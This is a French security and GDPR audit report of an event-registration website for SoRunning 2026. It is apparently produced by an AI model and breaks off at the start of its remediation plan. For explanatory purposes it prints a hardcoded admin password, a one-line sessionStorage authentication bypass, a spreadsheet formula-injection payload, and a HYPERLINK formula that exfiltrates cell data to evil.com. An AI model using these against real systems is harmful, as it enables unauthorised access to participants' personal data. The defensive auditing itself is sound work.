# Audit RGPD & Cybersécurité — SoRunning Inscriptions 2026

> **Date** : 2026-04-11  
> **Périmètre** : Revue complète du code source (7 113 lignes, 23 fichiers)  
> **Réalisé par** : Claude Sonnet 4.6 (analyse statique automatisée)

---

## Résumé exécutif

L'application **SoRunning Inscriptions 2026** est un site statique (HTML/CSS/JS) hébergé sur GitHub Pages pour la gestion des inscriptions au Challenge Connecté 2026. L'analyse révèle des **vulnérabilités critiques** qui doivent être corrigées avant tout déploiement en production.

| Domaine | Niveau de risque |
|---------|-----------------|
| Authentification | 🔴 CRITIQUE |
| Protection des données personnelles | 🔴 CRITIQUE |
| Conformité RGPD | 🔴 CRITIQUE |
| Validation des entrées | 🟠 ÉLEVÉ |
| Dépendances externes | 🟠 ÉLEVÉ |
| Gestion des erreurs | 🟡 MOYEN |
| Chiffrement | 🔴 CRITIQUE |

**Score de conformité RGPD estimé : ~5 % (ÉCHEC CRITIQUE)**  
**Niveau de risque global : ÉLEVÉ-CRITIQUE**

> ⚠️ **RECOMMANDATION : NE PAS DÉPLOYER** en l'état auprès d'utilisateurs réels sans les corrections prioritaires décrites ci-dessous.

---

## Table des matières

1. [Structure du projet](#1-structure-du-projet)
2. [Inventaire des données personnelles](#2-inventaire-des-données-personnelles)
3. [Vulnérabilités critiques de sécurité](#3-vulnérabilités-critiques-de-sécurité)
4. [Conformité RGPD article par article](#4-conformité-rgpd-article-par-article)
5. [Points de collecte des données](#5-points-de-collecte-des-données)
6. [Authentification et contrôle d'accès](#6-authentification-et-contrôle-daccès)
7. [Services tiers et intégrations externes](#7-services-tiers-et-intégrations-externes)
8. [Stockage des données](#8-stockage-des-données)
9. [Cookies et traceurs](#9-cookies-et-traceurs)
10. [Validation des entrées et sanitisation](#10-validation-des-entrées-et-sanitisation)
11. [Gestion des erreurs et fuite d'informations](#11-gestion-des-erreurs-et-fuite-dinformations)
12. [Dépendances et bibliothèques externes](#12-dépendances-et-bibliothèques-externes)
13. [Secrets et identifiants codés en dur](#13-secrets-et-identifiants-codés-en-dur)
14. [Rétention et suppression des données](#14-rétention-et-suppression-des-données)
15. [Documents légaux et politique de confidentialité](#15-documents-légaux-et-politique-de-confidentialité)
16. [Scénarios d'attaque](#16-scénarios-dattaque)
17. [Cartographie OWASP Top 10](#17-cartographie-owasp-top-10)
18. [Évaluation fichier par fichier](#18-évaluation-fichier-par-fichier)
19. [Plan de remédiation priorisé](#19-plan-de-remédiation-priorisé)

---

## 1. Structure du projet

```
SoRunning-inscriptions-2026/
├── index.html          (503 lignes) — Page d'accueil, portail inscription
├── inscription.html    ( 98 lignes) — Iframe Microsoft Forms
├── verify.html         (114 lignes) — Vérification d'inscription par ID
├── depot.html          (106 lignes) — Dépôt de preuves via Tally.so
├── resultats.html      (719 lignes) — Page résultats (protégée par mot de passe)
├── admin.html          (311 lignes) — Outil admin (dossards, stats, liste)
├── reglement.html      (335 lignes) — Règlement (12 articles)
├── cgu.html            (217 lignes) — CGU (10 articles)
├── home.html           ( 10 lignes) — Redirection legacy
├── script.js           (2411 lignes) — Logique admin (génération dossards, stats)
├── verify.js           ( 264 lignes) — Logique vérification (CSV, recherche)
├── style.css           (2021 lignes) — Design système (dark/light mode)
├── config.json         (  4 lignes) — Feature flags
├── data/
│   └── participants_anonymises_Challenge_Connecté_2026.csv  (52 Ko)
├── logo.png            ( 66 Ko)
├── README.md           (186 lignes)
└── CHANGELOG.md        (118 lignes)
```

---

## 2. Inventaire des données personnelles

### Catégories de données collectées

| Catégorie | Champs | Base légale supposée | Rétention | Niveau de risque |
|-----------|--------|---------------------|-----------|-----------------|
| **Identité** | Nom, prénom | Consentement (non documenté) | Indéfinie | 🔴 ÉLEVÉ |
| **Contact** | Email professionnel | Consentement (non documenté) | Indéfinie | 🔴 ÉLEVÉ |
| **Identifiants** | ID participant, N° dossard | Nécessité contractuelle | Durée de l'événement | 🟡 MOYEN |
| **Démographie** | Âge, sexe, région, société | Consentement (non documenté) | Indéfinie | 🟠 ÉLEVÉ |
| **Inférence santé** | Catégorie de course (5/10/21 km) | Nécessité | Durée de l'événement | 🟠 ÉLEVÉ |
| **Résultats** | Temps, classements, preuves | Consentement | Durée de l'événement | 🟡 MOYEN |
| **Biométrique** | Photos (preuves de participation) | Consentement (non documenté) | Indéfinie | 🔴 CRITIQUE |

**Volume estimé** : 795 à 900 participants (IDs séquentiels de 1 à 795+)

> ⚠️ Les photos de preuve constituent des données **potentiellement biométriques** (visages reconnaissables), soumises à une protection renforcée (Article 9 RGPD).

### Flux de données

```
Participant
    │
    ├─► Microsoft Forms (inscription.html)
    │       └─► Serveurs Microsoft (USA)
    │               └─► Export Excel → Admin SNCF
    │                       └─► localStorage navigateur (admin.html)
    │                               └─► CSV anonymisé → GitHub Pages (PUBLIC)
    │
    └─► Tally.so (depot.html)
            └─► Serveurs Tally (USA)
```

---

## 3. Vulnérabilités critiques de sécurité

### 3.1 🔴 CRITIQUE — Mot de passe codé en dur dans le code source

**Fichiers concernés :**
- [admin.html](admin.html) ligne 54
- [resultats.html](resultats.html) ligne 291

**Code vulnérable :**

```javascript
// admin.html:54 — VISIBLE DANS LE CODE SOURCE ET SUR GITHUB
const MDP = 'cc2026admin';

window.checkLogin = function() {
  const val = document.getElementById('loginInput').value;
  if (val === MDP) {
    sessionStorage.setItem('admin_ok', '1');
    document.getElementById('loginOverlay').style.display = 'none';
  }
};
```

**Problèmes identifiés :**
- Mot de passe visible en clair dans le code source de la page (F12 → Sources)
- Visible dans le dépôt GitHub (public ou accessible aux collaborateurs)
- Même mot de passe pour `admin.html` et `resultats.html`
- Contournement trivial via la console DevTools :
  ```javascript
  sessionStorage.setItem('admin_ok', '1'); // accès immédiat
  ```
- Aucune limitation du nombre de tentatives
- Aucun verrouillage de compte
- Aucun journal d'accès

**Impact RGPD :** Accès non autorisé à des données personnelles (noms, emails, âges, régions, sociétés).

**Remédiation :**
- Court terme : Retirer le mot de passe du code source ; utiliser HTTP Basic Auth côté serveur ou une variable d'environnement
- Long terme : Implémenter OAuth2 via SNCF SSO (Entra ID / Active Directory) avec MFA obligatoire
- Ajouter un journal d'audit de chaque connexion réussie ou échouée

---

### 3.2 🔴 CRITIQUE — Exposition de données personnelles dans un CSV public

**Fichier concerné :** [data/participants_anonymises_Challenge_Connecté_2026.csv](data/participants_anonymises_Challenge_Connecté_2026.csv)  
**Chargé par :** [verify.js](verify.js) ligne 8

**Structure du CSV :**
```
"ID";"NOM";"PRÉNOM";"EMAIL";"Course 5 km";"Course 10 km";...
"188";"A*****";"L*****";"l***.a****@sncf.fr";"";"1126";"2048";...
```

**Problèmes identifiés :**

| Problème | Détail |
|---------|--------|
| **Anonymisation insuffisante** | Première lettre + domaine email = réidentification triviale |
| **Accès public sans authentification** | `fetch(CSV_PATH)` sans token ni authentification (verify.js:70) |
| **Pas d'expiration** | Le fichier persiste indéfiniment sur GitHub |
| **Historique Git** | Les versions précédentes du CSV sont accessibles via l'API GitHub |
| **Dossards séquentiels** | Permettent de déduire le nombre total de participants |
| **Domaine email visible** | `@sncf.fr`, `@reseau.sncf.fr` révèlent l'employeur exact |

**Scénario de réidentification :**
```
Données CSV : "A*****" / "l***.a****@sncf.fr" / Région "IDF" / Âge ~35 / 5 km
Croisement annuaire SNCF → Identification en quelques minutes
```

**Articles RGPD violés :**
- **Article 5(1)(e)** — Limitation de la conservation (durée indéfinie)
- **Article 25** — Protection des données dès la conception (anonymisation non conforme CNIL)
- **Article 32** — Mesures de sécurité insuffisantes

**Remédiation :**
- Mettre le fichier CSV derrière une authentification (pas accessible publiquement)
- Remplacer la troncature par un hachage salé : `sha256(salt + email)` pour la recherche
- Définir une durée de rétention (ex : suppression automatique 30 jours après l'événement)
- Supprimer l'historique Git du fichier (`git filter-repo` ou BFG Repo Cleaner)

---

### 3.3 🔴 CRITIQUE — Authentification uniquement côté client

**Fichiers concernés :** [admin.html](admin.html), [resultats.html](resultats.html)

**Mécanisme actuel :**
```javascript
// sessionStorage utilisé comme seul mécanisme d'authentification
sessionStorage.setItem('admin_ok', '1');  // Contournable en 2 secondes
```

**Contournement en une ligne :**
```javascript
// Dans la console DevTools du navigateur :
sessionStorage.setItem('admin_ok', '1');
// → Accès complet à l'interface admin sans mot de passe
```

**Absence de :**
- Validation côté serveur
- Authentification multifacteur (MFA)
- Limitation du taux de tentatives (rate limiting)
- Journalisation des accès
- Expiration de session
- Protection CSRF
- Cloisonnement par rôle

**Remédiation :**
- Migrer vers un backend (Node.js, Python Flask, etc.) avec sessions serveur
- Implémenter OAuth2 / OIDC via SNCF Entra ID
- Ajouter MFA obligatoire pour l'accès admin
- Mettre en place un contrôle d'accès basé sur les rôles (RBAC)

---

### 3.4 🔴 CRITIQUE — Stockage de données sensibles en clair dans localStorage

**Fichier concerné :** [script.js](script.js) lignes 219–241

**Code vulnérable :**
```javascript
function saveAssignments(a) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(a));  // Clair, non chiffré
}
function loadAssignments() {
  return JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
}
```

**Données stockées en clair :**
- Assignations ID → Numéro de dossard
- Configurations et compteurs
- Résultats de l'événement

**Risques :**
- Lisible par n'importe quelle extension de navigateur
- Visible dans DevTools → Application → Local Storage
- Persistant entre les sessions (pas d'expiration)
- Non signé (intégrité non vérifiée)

**Remédiation :**
- Chiffrer les données avec TweetNaCl.js ou Web Crypto API avant stockage
- Ou mieux : stocker côté serveur (base de données chiffrée)
- Supprimer les données au déconnexion (ou après l'événement)

---

## 4. Conformité RGPD article par article

| Article | Intitulé | Statut | Problème constaté |
|---------|---------|--------|------------------|
| **Art. 5** | Principes relatifs au traitement | ❌ NON CONFORME | Confidentialité, limitation conservation, minimisation non respectées |
| **Art. 6** | Licéité du traitement | ❌ NON CONFORME | Base légale non documentée ; consentement supposé mais non tracé |
| **Art. 7** | Conditions du consentement | ❌ NON CONFORME | Aucune preuve de consentement recueillie |
| **Art. 9** | Données sensibles | ⚠️ À VÉRIFIER | Photos de preuves potentiellement biométriques |
| **Art. 12** | Transparence | ❌ NON CONFORME | Aucune politique de confidentialité dédiée |
| **Art. 13/14** | Information des personnes | ❌ NON CONFORME | Durée de conservation, destinataires, droits non indiqués |
| **Art. 15** | Droit d'accès | ⚠️ PARTIEL | Email de contact fourni, mais pas de procédure formelle |
| **Art. 17** | Droit à l'effacement | ❌ NON CONFORME | Aucun mécanisme de suppression côté utilisateur |
| **Art. 20** | Portabilité | ❌ NON CONFORME | Aucune fonctionnalité d'export pour les personnes |
| **Art. 21** | Droit d'opposition | ❌ NON CONFORME | Pas de mécanisme d'opposition |
| **Art. 25** | Protection dès la conception | ❌ NON CONFORME | Anonymisation insuffisante, pas de minimisation |
| **Art. 28** | Sous-traitant | ❌ NON CONFORME | Pas de DPA visible avec Microsoft ni Tally |
| **Art. 30** | Registre des traitements | ❌ NON CONFORME | Aucune documentation du traitement |
| **Art. 32** | Sécurité du traitement | ❌ NON CONFORME | Mot de passe en dur, stockage non chiffré |
| **Art. 33** | Notification de violation | ❌ NON CONFORME | Aucun plan de réponse aux incidents |
| **Art. 34** | Communication aux personnes | ❌ NON CONFORME | Aucun mécanisme de notification |
| **Art. 35** | AIPD (DPIA) | ❌ NON CONFORME | Non réalisée (obligatoire pour traitement à risque élevé) |
| **Art. 37** | DPO | ❌ NON CONFORME | Délégué à la Protection des Données non mentionné |

**Score global : ~5 % de conformité RGPD**

> ⚠️ **Risque d'amende CNIL** : jusqu'à 20 M€ ou 4 % du chiffre d'affaires annuel mondial (Article 83 RGPD)

---

## 5. Points de collecte des données

### Point 1 — Microsoft Forms (`inscription.html`)

- **URL** : `forms.office.com` (iframe embarqué)
- **Données collectées** : Nom, prénom, email professionnel, sexe, âge, région, société, catégorie de course
- **Traitement** : Exporté en `.xlsx`, importé dans `admin.html` via drag-and-drop
- **Problèmes** :
  - Données stockées initialement sur serveurs Microsoft (USA)
  - Pas de DPA visible avec Microsoft
  - Pas de mention explicite dans les CGU

### Point 2 — Tally.so (`depot.html`)

- **URL** : `tally.so/r/KYJJOM`
- **Données collectées** : Preuves de participation (photos, captures), email, catégorie
- **Traitement** : Stockées sur serveurs Tally (USA)
- **Problèmes** :
  - Entreprise américaine (transfert hors UE sans garanties documentées)
  - Pas de DPA visible
  - Photos = données potentiellement biométriques
  - Durée de rétention inconnue

### Point 3 — CSV de vérification (`verify.html`)

- **Fichier** : `data/participants_anonymises_Challenge_Connecté_2026.csv`
- **Données exposées** : ID, nom masqué, email masqué, numéros de dossard, participation par catégorie
- **Problèmes** :
  - Accès public sans authentification
  - Énumération triviale des IDs (1 → 795)
  - Anonymisation réversible

### Point 4 — Upload Excel admin (`admin.html`)

- **Mécanisme** : Drag-and-drop d'un fichier `.xlsx`
- **Données traitées** : Tous les champs PII (noms complets, emails, données démographiques)
- **Stockage** : `localStorage` en clair
- **Problèmes** :
  - Fichier complet avec PII chargé en mémoire navigateur
  - Données visibles dans DevTools → Application
  - Pas de suppression automatique après traitement

---

## 6. Authentification et contrôle d'accès

### Matrice d'accès actuelle

| Ressource | Authentification | Type | Risque |
|-----------|-----------------|------|--------|
| `/index.html` | Aucune | Public | 🟢 FAIBLE |
| `/inscription.html` | Aucune | Public (Microsoft Forms) | 🟡 MOYEN |
| `/verify.html` | Aucune | Public (ID séquentiel) | 🔴 ÉLEVÉ |
| `/data/*.csv` | Aucune | **Public** | 🔴 CRITIQUE |
| `/admin.html` | Mot de passe client | Contournable | 🔴 CRITIQUE |
| `/resultats.html` | Mot de passe client | Contournable | 🔴 CRITIQUE |
| `/depot.html` | Aucune | Public (Tally) | 🟡 MOYEN |

### Ce qui manque

- [ ] Authentification côté serveur (pas de validation client-side)
- [ ] Authentification multifacteur (MFA)
- [ ] Gestion des sessions avec expiration
- [ ] Journalisation des accès (qui, quand, depuis quelle IP)
- [ ] Contrôle d'accès basé sur les rôles (RBAC)
- [ ] Protection contre la force brute
- [ ] Révocation de sessions
- [ ] Protection CSRF

---

## 7. Services tiers et intégrations externes

### Tableau des services tiers

| Service | Usage | Localisation données | DPA | SRI | Risque |
|---------|-------|---------------------|-----|-----|--------|
| **Microsoft Forms** | Formulaire d'inscription | USA (Microsoft Azure) | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
| **Tally.so** | Dépôt de preuves | USA (Tally) | ❌ Non visible | ❌ Non | 🟠 ÉLEVÉ |
| **Strava** | Lien communauté | USA | N/A (lien externe) | N/A | 🟡 MOYEN |
| **Viva Engage** | Lien communauté SNCF | EU (Microsoft) | ❌ Non visible | N/A | 🟡 MOYEN |
| **cdnjs.cloudflare.com** | SheetJS, html2canvas | USA (Cloudflare) | N/A | ❌ Non | 🟠 ÉLEVÉ |
| **Google Fonts** | Typographie | USA (Google) | N/A | N/A | 🟡 MOYEN |

### Absence de Subresource Integrity (SRI)

**Code actuel (admin.html:7-8) :**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
```

**Risque :** Si le CDN est compromis, du code malveillant pourrait être injecté et exécuté lors de l'import de fichiers Excel (exfiltration des données PII).

**Remédiation :**
```html
<script 
  src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"
  integrity="sha384-[HASH_À_CALCULER]"
  crossorigin="anonymous">
</script>
```

Générer les hashes : `openssl dgst -sha384 -binary xlsx.full.min.js | openssl base64 -A`

### En-têtes de sécurité manquants

GitHub Pages ne permet pas la configuration d'en-têtes HTTP personnalisés. Les en-têtes suivants sont absents :

```
Content-Security-Policy: default-src 'self'; script-src 'self' cdnjs.cloudflare.com tally.so; frame-src forms.office.com tally.so
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**Remédiation :** Utiliser Cloudflare (plan gratuit) devant GitHub Pages pour injecter ces en-têtes via des règles de transformation.

---

## 8. Stockage des données

### Inventaire des emplacements de stockage

#### GitHub Repository (Public)
- **Fichier** : `data/participants_anonymises_Challenge_Connecté_2026.csv`
- **Accès** : Public via URL directe **et** via l'API GitHub
- **Problème** : L'historique Git conserve toutes les versions précédentes du fichier

#### localStorage navigateur
```javascript
// Clés utilisées (script.js)
'challenge2026_theme'       // Préférence dark/light
'challenge2026_config'      // Configuration de l'événement
'challenge2026_assignments' // Mapping ID → Dossard (PII)
'challenge2026_counters'    // Compteurs dossards
```
- **Problème** : Données PII en clair, persistantes, lisibles par toute extension JS

#### sessionStorage navigateur
```javascript
'admin_ok'      // Flag d'authentification admin
'resultats_ok'  // Flag d'authentification résultats
```
- **Problème** : Contournable via DevTools

#### Microsoft Forms (externe)
- Réponses sur serveurs Microsoft
- Pas sous contrôle SNCF direct

#### Tally.so (externe)
- Preuves de participation sur serveurs Tally
- Pas sous contrôle SNCF direct

---

## 9. Cookies et traceurs

### État actuel

| Type | Émetteur | Statut | Consentement demandé |
|------|---------|--------|---------------------|
| Cookies fonctionnels app | Aucun | N/A | N/A |
| Cookies Microsoft Forms | Microsoft | Probable | ❌ Non |
| Cookies Tally.so | Tally | Probable | ❌ Non |
| Cookies GitHub Pages | GitHub/Fastly | Possible | ❌ Non |
| localStorage | Application | Oui | ❌ Non |

### Problèmes

- ❌ Aucune bannière de consentement aux cookies
- ❌ Aucune politique de cookies
- ❌ localStorage utilisé comme alternative aux cookies sans divulgation
- ❌ Services tiers susceptibles de déposer des traceurs sans information

**Remédiation :**
- Ajouter une bannière de consentement conforme CNIL (Axeptio, CookieBot, ou développement maison)
- Créer une page "Gestion des cookies"
- Documenter tous les traceurs dans la politique de confidentialité

---

## 10. Validation des entrées et sanitisation

### Couverture actuelle

| Entrée | Validation | Sanitisation | Risque |
|--------|-----------|--------------|--------|
| Recherche ID (verify.js:127) | `trim()` + `toLowerCase()` | `escapeHtml()` | 🟡 MOYEN |
| Upload Excel (script.js:345) | Extension `.xlsx/.xls` seulement | XLSX.read() | 🟠 ÉLEVÉ |
| Mot de passe admin (admin.html:59) | Comparaison chaîne | Aucune | 🟠 ÉLEVÉ |
| Formulaire Microsoft | Géré par Microsoft | N/A | 🟢 FAIBLE |
| Formulaire Tally | Géré par Tally | N/A | 🟢 FAIBLE |

### XSS — Analyse

**Implémentation de `escapeHtml()` (verify.js) :**
```javascript
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}
```
✅ Implémentation correcte

**Mais usage via innerHTML (verify.js:117) :**
```javascript
el.innerHTML = html;  // ⚠️ Risque si escapeHtml() n'est pas appelé partout
```

**Usage non sécurisé identifié dans script.js :**
```javascript
// Plusieurs occurrences d'innerHTML sans sanitisation garantie (lignes 142, 149, 156)
element.innerHTML = buildCardHtml(participant);
```

### Validation de fichier Excel — Manques

```javascript
// script.js:378 — Aucune validation de schéma
const data = XLSX.utils.sheet_to_json(ws, { defval: '' });
parseParticipants(data);  // Données utilisées directement sans validation
```

**Problèmes :**
- Pas de limite de taille de fichier
- Pas de validation du schéma (colonnes attendues vs présentes)
- Pas de vérification des types de données
- Injection Excel possible : `=cmd|'/c calc'!A1` dans une cellule → risque si réexporté en CSV ouvert dans Excel

**Remédiation :**
- Remplacer `innerHTML` par `textContent` pour les contenus textuels
- Implémenter une validation de schéma (ex. vérifier la présence des colonnes `ID`, `NOM`, `PRÉNOM`)
- Limiter la taille des fichiers uploadés (max 10 Mo)
- Valider les types et formats de chaque champ avant traitement

---

## 11. Gestion des erreurs et fuite d'informations

### Messages d'erreur exposés

**verify.js (lignes 131-165) :**
```javascript
setStatus('error', `
  <small>${escapeHtml(csvError)}</small>  // ← Message d'erreur brut affiché
`);
```

**Exemples de fuites possibles :**
- `"HTTP 404"` → révèle que le fichier n'existe pas
- `"Failed to fetch"` → révèle la configuration réseau
- Erreurs de parsing avec numéros de ligne → révèle la structure du CSV

**Remédiation :**
```javascript
// Mauvais
setStatus('error', `Erreur: ${escapeHtml(csvError)}`);

// Bon
console.error('[AUDIT]', csvError);  // Log côté développeur
setStatus('error', 'Impossible de charger les données. Contactez l\'organisateur.');
```

---

## 12. Dépendances et bibliothèques externes

### Bibliothèques utilisées

| Bibliothèque | Version | Source | SRI | Vulnérabilités connues |
|-------------|---------|--------|-----|----------------------|
| **SheetJS (xlsx)** | 0.18.5 | cdnjs | ❌ Non | Aucune critique connue |
| **html2canvas** | 1.4.1 | cdnjs | ❌ Non | Aucune critique connue |
| **Google Fonts** | Latest | googleapis.com | N/A | Aucune |
| **Tally Embed** | Latest | tally.so | ❌ Non | Inconnue |

### Risques

- **Absence de SRI** : Un attaquant compromettant le CDN peut injecter du code malveillant
- **Version fixe mais non vérifiée** : `0.18.5` est spécifié mais aucun hash ne garantit l'intégrité
- **Tally embed script** : Version non épinglée, mise à jour automatique possible

### Actions à réaliser

1. Calculer les hashes SRI pour chaque script externe
2. Mettre à jour SheetJS (vérifier les versions 0.20+)
3. Envisager de self-héberger les bibliothèques critiques

---

## 13. Secrets et identifiants codés en dur

### Identifiants trouvés

| Fichier | Ligne | Valeur | Risque |
|---------|-------|--------|--------|
| [admin.html](admin.html) | 54 | `'cc2026admin'` | 🔴 CRITIQUE |
| [resultats.html](resultats.html) | 291 | `'cc2026admin'` | 🔴 CRITIQUE |
| [index.html](index.html) | 426 | ID groupe Viva Engage encodé en base64 | 🟡 MOYEN |

**Viva Engage URL (index.html:426) :**
```
eyJfdHlwZSI6Ikdyb3VwIiwiaWQiOiI2Nzg4NTg4In0
→ Décodé : {"_type":"Group","id":"6788588"}
```

Expose la structure interne des groupes SNCF.

### Identifiant Microsoft Forms

**inscription.html:69 :**
```
?id=OIJ8SplXFkufxprY_OWn2d7Qab57piJJu3lLE68KpuFUMzlDS0NQRkk5WUY1R1U4UVhWNUM2VzBXOCQlQCN0PWcu
```

Cet ID de formulaire est public mais révèle l'identifiant interne de l'organisation Microsoft 365 de SNCF.

---

## 14. Rétention et suppression des données

### État actuel

| Stockage | Durée | Expiration auto | Suppression utilisateur |
|---------|-------|-----------------|------------------------|
| CSV GitHub | **Indéfinie** | ❌ Non | ❌ Non |
| localStorage | **Indéfinie** | ❌ Non | ❌ Non |
| sessionStorage | Session navigateur | ✅ Oui | N/A |
| Microsoft Forms | Inconnue (>30 j) | ❌ Inconnue | ❌ Non disponible |
| Tally.so | Inconnue | ❌ Inconnue | ❌ Non disponible |

### Ce qui manque

- **Politique de rétention documentée** (obligatoire Article 13 RGPD)
- **Suppression automatique** après la fin de l'événement (J+30 recommandé)
- **Mécanisme de demande d'effacement** pour les participants (Article 17 RGPD)
- **Procédure de suppression du CSV** après archivage sécurisé

### Durée de rétention recommandée

| Donnée | Durée recommandée | Justification |
|--------|------------------|---------------|
| Données d'inscription | J+30 après l'événement | Gestion des réclamations post-événement |
| Résultats anonymisés | 1 an | Historique sportif |
| Photos de preuves | J+30 après validation | Vérification uniquement |
| Journaux d'accès | 6 mois | Sécurité (Article 32) |

---

## 15. Documents légaux et politique de confidentialité

### Documents existants

#### CGU (cgu.html) — État actuel
- ✅ Mentionne le RGPD (Article 4 des CGU)
- ✅ Fournit un email de contact `sorunningsncf@sncf.fr`
- ❌ Ne liste **pas** tous les champs collectés (âge, sexe, région, société manquants)
- ❌ Ne précise **pas** la durée de conservation
- ❌ Ne mentionne **pas** les sous-traitants (Microsoft, Tally)
- ❌ Ne mentionne **pas** les cookies et traceurs
- ❌ Ne définit **pas** la base légale du traitement
- ❌ Ne décrit **pas** comment exercer les droits RGPD (Article 17, 20, 21)

#### Règlement (reglement.html)
- Document sportif (12 articles) — non concerné par les obligations de confidentialité

### Documents manquants

| Document | Obligatoire | Priorité |
|---------|------------|---------|
| **Politique de confidentialité** | ✅ Article 13/14 RGPD | 🔴 CRITIQUE |
| **DPA avec Microsoft** | ✅ Article 28 RGPD | 🔴 CRITIQUE |
| **DPA avec Tally** | ✅ Article 28 RGPD | 🔴 CRITIQUE |
| **Registre des traitements** | ✅ Article 30 RGPD | 🟠 ÉLEVÉ |
| **AIPD / DPIA** | ✅ Article 35 RGPD (traitement à risque) | 🟠 ÉLEVÉ |
| **Plan de réponse aux incidents** | ✅ Article 33 RGPD | 🟠 ÉLEVÉ |
| **Politique de cookies** | ✅ Loi LCEN + RGPD | 🟠 ÉLEVÉ |

---

## 16. Scénarios d'attaque

### Scénario 1 — Exfiltration du CSV participant (Probabilité : TRÈS ÉLEVÉE)

```
1. Attaquant accède à l'URL du CSV (publique, pas d'auth)
2. Télécharge participants_anonymises_Challenge_Connecté_2026.csv
3. Croise première lettre + domaine email + région → réidentification
4. Résultat : 795+ profils de salariés SNCF identifiés
```

**Impact :** Violation de données massives, notification CNIL obligatoire sous 72h (Article 33)

---

### Scénario 2 — Contournement de l'authentification admin (Probabilité : TRÈS ÉLEVÉE)

```
1. Attaquant ouvre admin.html
2. F12 → Console → sessionStorage.setItem('admin_ok', '1')
3. Accès complet : liste participants, génération dossards, export CSV
4. Export de la liste complète avec données PII en clair
```

**Impact :** Accès non autorisé à toutes les données personnelles

---

### Scénario 3 — Énumération brute des participants (Probabilité : ÉLEVÉE)

```
1. Script automatisé boucle sur IDs 1 à 1000
2. Pour chaque ID : requête à verify.html + lecture CSV
3. Aucune limitation de débit → terminé en < 5 minutes
4. Collecte de tous les profils masqués
```

**Code d'attaque exemple :**
```python
import requests
for id in range(1, 1000):
    # Requête directe au CSV + recherche par ID
    # → collecte toutes les données
```

---

### Scénario 4 — Attaque supply chain via CDN (Probabilité : FAIBLE, Impact : CRITIQUE)

```
1. Compromise de cdnjs.cloudflare.com
2. Injection de code malveillant dans xlsx.full.min.js
3. À l'ouverture de admin.html, le code malveillant s'exécute
4. Exfiltration de tous les fichiers Excel uploadés vers un serveur attaquant
```

**Prévention : SRI (Subresource Integrity) — voir section 12**

---

### Scénario 5 — Injection Excel (Probabilité : MOYENNE)

```
1. Attaquant prépare un fichier Excel avec des formules malveillantes
2. Admin télécharge ce fichier "participant" piégé
3. L'app le traite via SheetJS
4. Si les données sont réexportées en CSV et ouvertes dans Excel :
   =HYPERLINK("https://evil.com/"&A1,"Cliquez ici") → exfiltration
```

---

## 17. Cartographie OWASP Top 10

| Risque OWASP | Constat | Sévérité | Fichier:Ligne |
|-------------|---------|----------|--------------|
| **A01 — Broken Access Control** | Mot de passe hardcodé, contournement DevTools | 🔴 CRITIQUE | admin.html:54 |
| **A02 — Cryptographic Failures** | localStorage en clair, CSV public | 🔴 CRITIQUE | script.js:219 |
| **A03 — Injection** | innerHTML avec données non totalement sanitisées | 🟠 ÉLEVÉ | verify.js:117 |
| **A04 — Insecure Design** | Pas d'architecture d'authentification | 🔴 CRITIQUE | Global |
| **A05 — Security Misconfiguration** | Pas de CSP, pas de SRI, pas d'en-têtes | 🟠 ÉLEVÉ | Tous HTML |
| **A06 — Vulnerable/Outdated Components** | Pas de SRI, versions non vérifiées | 🟡 MOYEN | admin.html:7-8 |
| **A07 — Auth & Session Management** | Auth client uniquement, pas de MFA | 🔴 CRITIQUE | admin.html:54-69 |
| **A08 — Data Integrity Failures** | Pas d'intégrité sur le CSV, pas de SRI | 🟠 ÉLEVÉ | data/ |
| **A09 — Logging & Monitoring** | Aucun journal d'accès ni d'audit | 🟠 ÉLEVÉ | Global |
| **A10 — SSRF** | Formulaires externes sans validation | 🟡 MOYEN | inscription.html:69 |

---

## 18. Évaluation fichier par fichier

### [index.html](index.html) — 🟡 FAIBLE-MOYEN
- Pas de traitement de données
- Liens externes (Strava, WhatsApp, Viva Engage)
- **Problème** : URL Viva Engage expose l'ID groupe SNCF (ligne 426)

### [inscription.html](inscription.html) — 🟡 MOYEN
- Iframe Microsoft Forms
- Pas de traitement local
- **Problème** : Pas de bannière de consentement préalable à l'affichage du formulaire

### [verify.html](verify.html) — 🟠 ÉLEVÉ
- Charge et expose le CSV public
- Recherche par ID séquentiel (énumérable)
- `escapeHtml()` présent mais `innerHTML` utilisé
- **Problème principal** : CSV accessible sans authentification

### [admin.html](admin.html) — 🔴 CRITIQUE
- Mot de passe hardcodé (ligne 54)
- Upload et traitement Excel avec PII
- Stockage localStorage non chiffré
- Export CSV avec données complètes
- **Action requise** : Réécriture complète avec auth serveur

### [depot.html](depot.html) — 🟡 MOYEN
- Embed Tally.so
- Affichage conditionnel via `config.json`
- **Problème** : Pas de SRI sur le script Tally (ligne 7)

### [resultats.html](resultats.html) — 🔴 CRITIQUE
- Mêmes problèmes qu'`admin.html` (mot de passe hardcodé ligne 291)
- Charge des fichiers CSV via upload
- **Action requise** : Réécriture avec auth serveur

### [reglement.html](reglement.html) — 🟢 FAIBLE
- Document statique, aucun problème de sécurité

### [cgu.html](cgu.html) — 🟡 MOYEN
- Document légal insuffisant (voir section 15)
- **Action requise** : Compléter avec politique de confidentialité détaillée

### [script.js](script.js) — 🟠 ÉLEVÉ
- 2411 lignes de logique admin
- Pas de validation de schéma (ligne 378)
- `innerHTML` utilisé (lignes 142, 149, 156)
- localStorage non chiffré (lignes 219-240)
- Construction d'URL `mailto:` avec données personnelles (ligne ~1857)

### [verify.js](verify.js) — 🟡 MOYEN
- `escapeHtml()` implémenté ✅
- `innerHTML` utilisé malgré sanitisation (ligne 117)
- CSV chargé sans authentification (ligne 70)

---

## 19. Plan de remédiation priorisé

### Phase 1 — Urgences (sous 1 semaine)

#### 1.1 Sécuriser l'accès admin et résultats

**Effort :** 4-8 heures  
**Impact :** Élimine la vulnérabilité la plus critique

